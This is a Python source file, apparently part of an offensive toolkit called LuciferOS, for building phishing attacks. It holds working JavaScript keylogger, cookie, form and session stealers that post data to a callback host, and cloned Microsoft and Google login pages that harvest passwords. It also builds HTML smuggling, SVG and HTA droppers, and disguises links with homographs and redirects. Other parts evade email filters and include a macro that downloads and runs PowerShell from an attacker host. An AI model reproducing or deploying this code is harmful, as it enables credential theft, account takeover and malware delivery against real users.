#!/usr/bin/env python3
"""
LuciferOS Attack Payload Embedder
Embed various attack payloads in emails, documents, and web pages
"""

import base64
import random
import string
import urllib.parse
from typing import Dict, List, Optional
from datetime import datetime
import json
import hashlib


class PayloadEmbedder:
    """
    Embed attack payloads in various formats
    """
    
    # JavaScript payloads for credential harvesting
    JS_PAYLOADS = {
        'keylogger': '''
<script>
(function(){
    var log='';
    document.addEventListener('keypress',function(e){
        log+=e.key;
        if(log.length>50){
            new Image().src='{callback_url}?k='+btoa(log);
            log='';
        }
    });
})();
</script>
''',
        'form_stealer': '''
<script>
document.addEventListener('submit',function(e){
    var d={};
    new FormData(e.target).forEach(function(v,k){d[k]=v;});
    navigator.sendBeacon('{callback_url}',JSON.stringify(d));
});
</script>
''',
        'cookie_stealer': '''
<script>
new Image().src='{callback_url}?c='+btoa(document.cookie);
</script>
''',
        'credential_phish': '''
<script>
document.querySelector('form').addEventListener('submit',function(e){
    e.preventDefault();
    var u=document.querySelector('input[type="email"],input[name*="user"]')?.value;
    var p=document.querySelector('input[type="password"]')?.value;
    fetch('{callback_url}',{method:'POST',body:JSON.stringify({u:u,p:p})});
    setTimeout(function(){e.target.submit();},500);
});
</script>
''',
        'session_hijack': '''
<script>
(function(){
    var s={
        cookies:document.cookie,
        localStorage:JSON.stringify(localStorage),
        sessionStorage:JSON.stringify(sessionStorage),
        url:location.href
    };
    fetch('{callback_url}',{method:'POST',body:JSON.stringify(s)});
})();
</script>
''',
    }
    
    # Hidden tracking pixel templates
    TRACKING_PIXELS = {
        'standard': '<img src="{callback_url}?id={tracking_id}" width="1" height="1" style="display:none">',
        'css': '<div style="background:url({callback_url}?id={tracking_id});width:1px;height:1px;position:absolute;left:-9999px"></div>',
        'zero_font': '<span style="font-size:0"><img src="{callback_url}?id={tracking_id}"></span>',
    }
    
    # Link disguise techniques
    LINK_DISGUISES = {
        'homograph': {
            # Lookalike characters
            'a': ['а', 'ạ', 'ą'],  # Cyrillic a, Vietnamese, Polish
            'e': ['е', 'ẹ', 'ę'],
            'o': ['о', 'ọ', 'ø'],
            'i': ['і', 'ị', 'ı'],
            'c': ['с', 'ç'],
            'p': ['р'],
            's': ['ѕ'],
        },
        'url_shorteners': [
            'https://bit.ly/',
            'https://tinyurl.com/',
            'https://t.co/',
            'https://goo.gl/',
            'https://ow.ly/',
        ],
    }
    
    # File attachment payloads (base64 templates)
    FILE_PAYLOADS = {
        'html_smuggle': '''
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
var data = '{payload_b64}';
var blob = new Blob([atob(data)], {type:'application/octet-stream'});
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = '{filename}';
document.body.appendChild(a);
a.click();
</script>
<p>Your download will start automatically...</p>
</body>
</html>
''',
        'svg_script': '''
<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
{js_payload}
</script>
</svg>
''',
        'hta_payload': '''
<html>
<head>
<script language="VBScript">
Sub RunScript
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "{command}"
End Sub
</script>
</head>
<body onload="RunScript">
</body>
</html>
''',
    }
    
    def __init__(self, callback_url: str = None):
        self.callback_url = callback_url or 'http://localhost:5000/collect'
        self.tracking_ids = {}
    
    def generate_tracking_id(self, email: str) -> str:
        """Generate a unique tracking ID for an email"""
        unique = f"{email}-{datetime.now().isoformat()}-{random.randint(1000, 9999)}"
        tracking_id = hashlib.md5(unique.encode()).hexdigest()[:12]
        self.tracking_ids[tracking_id] = {'email': email, 'created': datetime.now().isoformat()}
        return tracking_id
    
    def embed_tracking_pixel(self, html: str, email: str, method: str = 'standard') -> str:
        """Embed a tracking pixel in HTML email"""
        tracking_id = self.generate_tracking_id(email)
        pixel = self.TRACKING_PIXELS.get(method, self.TRACKING_PIXELS['standard'])
        pixel = pixel.format(callback_url=self.callback_url, tracking_id=tracking_id)
        
        # Insert before </body> or at end
        if '</body>' in html:
            return html.replace('</body>', f'{pixel}</body>')
        return html + pixel
    
    def embed_js_payload(self, html: str, payload_type: str = 'form_stealer') -> str:
        """Embed JavaScript payload in HTML"""
        payload = self.JS_PAYLOADS.get(payload_type)
        if not payload:
            return html
        
        payload = payload.format(callback_url=self.callback_url)
        
        # Insert before </body>
        if '</body>' in html:
            return html.replace('</body>', f'{payload}</body>')
        return html + payload
    
    def create_phishing_link(self, real_url: str, display_url: str = None, 
                            method: str = 'encoded') -> Dict:
        """Create a disguised phishing link"""
        if method == 'encoded':
            # URL encode to hide the real domain
            encoded = urllib.parse.quote(real_url, safe='')
            link = f"https://www.google.com/url?q={encoded}"
        
        elif method == 'homograph':
            # Create lookalike domain
            fake_domain = display_url or 'google.com'
            for char, replacements in self.LINK_DISGUISES['homograph'].items():
                if char in fake_domain and random.random() > 0.5:
                    fake_domain = fake_domain.replace(char, random.choice(replacements), 1)
            link = f"https://{fake_domain}@{real_url.replace('https://', '').replace('http://', '')}"
        
        elif method == 'redirect':
            # Use open redirect
            redirect_param = urllib.parse.quote(real_url)
            link = f"https://www.google.com/search?q=redirect&url={redirect_param}"
        
        else:
            link = real_url
        
        return {
            'link': link,
            'real_url': real_url,
            'method': method,
            'html': f'<a href="{link}">{display_url or real_url}</a>'
        }
    
    def create_html_smuggling_page(self, payload_bytes: bytes, filename: str) -> str:
        """Create HTML page that delivers payload via HTML smuggling"""
        payload_b64 = base64.b64encode(payload_bytes).decode()
        
        html = self.FILE_PAYLOADS['html_smuggle']
        html = html.format(payload_b64=payload_b64, filename=filename)
        
        return html
    
    def create_malicious_svg(self, js_code: str) -> str:
        """Create SVG with embedded JavaScript"""
        svg = self.FILE_PAYLOADS['svg_script']
        return svg.format(js_payload=js_code)
    
    def create_hta_dropper(self, command: str) -> str:
        """Create HTA file that executes command"""
        hta = self.FILE_PAYLOADS['hta_payload']
        return hta.format(command=command)
    
    def create_credential_harvester_page(self, target_site: str, callback_url: str = None) -> str:
        """Create a credential harvesting login page"""
        callback = callback_url or self.callback_url
        
        # Map common sites to their login page styles
        templates = {
            'microsoft': {
                'title': 'Sign in to your account',
                'logo': 'https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg',
                'bg_color': '#f2f2f2',
                'btn_color': '#0067b8',
            },
            'google': {
                'title': 'Sign in',
                'logo': 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png',
                'bg_color': '#ffffff',
                'btn_color': '#1a73e8',
            },
            'office365': {
                'title': 'Sign in',
                'logo': 'https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b',
                'bg_color': '#f2f2f2',
                'btn_color': '#0078d4',
            },
        }
        
        # Get template or use generic
        site_lower = target_site.lower()
        tpl = None
        for key, value in templates.items():
            if key in site_lower:
                tpl = value
                break
        
        if not tpl:
            tpl = templates['microsoft']
        
        html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>{tpl['title']}</title>
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: {tpl['bg_color']};
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .container {{
            background: white;
            padding: 44px;
            border-radius: 4px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            max-width: 440px;
            width: 100%;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 24px;
        }}
        .logo img {{
            max-height: 36px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 20px 0;
        }}
        input {{
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #666;
            border-radius: 2px;
            box-sizing: border-box;
            font-size: 15px;
        }}
        input:focus {{
            border-color: {tpl['btn_color']};
            outline: none;
        }}
        button {{
            width: 100%;
            padding: 12px;
            background: {tpl['btn_color']};
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 16px;
        }}
        button:hover {{
            opacity: 0.9;
        }}
        .links {{
            margin-top: 20px;
            font-size: 13px;
        }}
        .links a {{
            color: {tpl['btn_color']};
            text-decoration: none;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{tpl['logo']}" alt="Logo">
        </div>
        <h1>{tpl['title']}</h1>
        <form id="loginForm" action="{callback}/login" method="POST">
            <input type="email" name="email" placeholder="Email, phone, or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
        <div class="links">
            <a href="#">Forgot password?</a><br>
            <a href="#">Create account</a>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            var email = document.querySelector('input[name="email"]').value;
            var password = document.querySelector('input[name="password"]').value;
            
            // Send to callback
            fetch('{callback}', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{email: email, password: password, site: '{target_site}'}}),
                mode: 'no-cors'
            }});
            
            // Redirect to real site after delay
            setTimeout(function() {{
                window.location.href = 'https://{target_site}';
            }}, 1000);
        }});
    </script>
</body>
</html>
'''
        return html
    
    def encode_payload_for_email(self, payload: str) -> str:
        """Encode payload to evade email filters"""
        # Split JavaScript keywords
        keywords = ['script', 'eval', 'function', 'document', 'window']
        encoded = payload
        
        for kw in keywords:
            # Insert zero-width characters
            split_kw = '\u200b'.join(list(kw))
            encoded = encoded.replace(kw, split_kw)
        
        return encoded
    
    def create_macro_document_instructions(self) -> str:
        """Instructions for creating malicious macro documents"""
        return '''
=== Malicious Macro Document Creation ===

1. VBA Macro Payload (Word/Excel):
   Sub AutoOpen()
       Shell "powershell -ep bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"""
   End Sub

2. To embed in document:
   - Create new Word/Excel document
   - Press Alt+F11 to open VBA editor
   - Insert > Module
   - Paste the macro code
   - Save as .docm or .xlsm

3. Delivery methods:
   - Email attachment
   - File sharing link
   - USB drop
   
4. Social engineering text:
   "Please enable macros to view this document"
   "Content requires macro permission for proper display"
'''
    
    def get_all_payload_types(self) -> Dict:
        """Get all available payload types"""
        return {
            'js_payloads': list(self.JS_PAYLOADS.keys()),
            'tracking_methods': list(self.TRACKING_PIXELS.keys()),
            'link_disguise_methods': ['encoded', 'homograph', 'redirect'],
            'file_payloads': list(self.FILE_PAYLOADS.keys()),
        }


class CollectorServer:
    """
    Simple collector server for received data
    """
    
    def __init__(self):
        self.collected_data = []
        self.email_opens = []
        self.credentials = []
    
    def log_email_open(self, tracking_id: str, ip: str, user_agent: str):
        """Log when an email is opened"""
        self.email_opens.append({
            'tracking_id': tracking_id,
            'ip': ip,
            'user_agent': user_agent,
            'timestamp': datetime.now().isoformat()
        })
    
    def log_credential(self, email: str, password: str, source: str):
        """Log captured credentials"""
        self.credentials.append({
            'email': email,
            'password': password,
            'source': source,
            'timestamp': datetime.now().isoformat()
        })
    
    def log_data(self, data: Dict, source: str):
        """Log any collected data"""
        self.collected_data.append({
            'data': data,
            'source': source,
            'timestamp': datetime.now().isoformat()
        })
    
    def get_stats(self) -> Dict:
        """Get collection statistics"""
        return {
            'total_email_opens': len(self.email_opens),
            'total_credentials': len(self.credentials),
            'total_data_collected': len(self.collected_data),
            'unique_ips': len(set(e['ip'] for e in self.email_opens)),
        }


# Global instances
_embedder = None
_collector = None

def get_payload_embedder(callback_url: str = None) -> PayloadEmbedder:
    global _embedder
    if _embedder is None:
        _embedder = PayloadEmbedder(callback_url)
    return _embedder

def get_collector() -> CollectorServer:
    global _collector
    if _collector is None:
        _collector = CollectorServer()
    return _collector


if __name__ == "__main__":
    print("Payload Embedder System")
    print("=" * 50)
    
    embedder = PayloadEmbedder("http://attacker.com/collect")
    
    print("\nAvailable payload types:")
    for category, items in embedder.get_all_payload_types().items():
        print(f"\n{category}:")
        for item in items:
            print(f"  - {item}")
    
    print("\n\nExample credential harvesting page (Microsoft-style):")
    print("-" * 50)
    page = embedder.create_credential_harvester_page("login.microsoftonline.com")
    print(page[:500] + "...")
